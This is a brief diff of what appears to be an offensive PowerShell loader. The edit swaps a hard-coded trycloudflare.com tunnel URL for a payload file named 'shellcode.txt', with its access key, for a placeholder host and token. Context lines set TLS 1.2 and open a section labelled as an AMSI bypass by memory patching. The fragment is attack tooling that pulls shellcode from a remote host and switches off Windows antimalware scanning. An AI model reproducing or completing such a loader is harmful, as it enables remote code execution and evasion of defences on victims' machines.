@@ -1,4 +1,4 @@
-$u='https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/shellcode.txt?key=57c36cda7fe1823797273b065ea3b8f8'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 # === AMSI Bypass - Memory Patch ===
